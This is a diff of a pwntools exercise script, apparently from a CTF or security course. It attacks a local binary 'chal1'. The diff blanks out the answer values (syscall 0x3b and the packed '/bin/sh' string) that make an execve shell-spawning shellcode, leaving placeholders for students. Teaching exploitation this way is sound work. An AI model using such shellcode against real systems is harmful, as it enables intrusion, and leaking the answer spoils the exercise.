@@ -1,7 +1,7 @@
 from pwn import *
 context.log_level='debug'
 p = process("./chal1")
-# p = remote("127.0.0.1",60001)
+# p = remote("127.0.0.1", 60001)
 
 # Tip: In x64, 
 # rdi/rsi/rdx is the register to store the first/second/third parameter of a syscall
@@ -11,11 +11,9 @@ p = process("./chal1")
 # There is a template of syscall(v1,v2,0,0)
 # You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
 # Your task is understanding and completing the shellcode
-# v1 = 
-# v2 = 
 
-v1 = 0x3b
-v2 = hex(u64("/bin/sh\0"))
+v1 = ?
+v2 = ?
 
 context.arch = 'amd64'
 
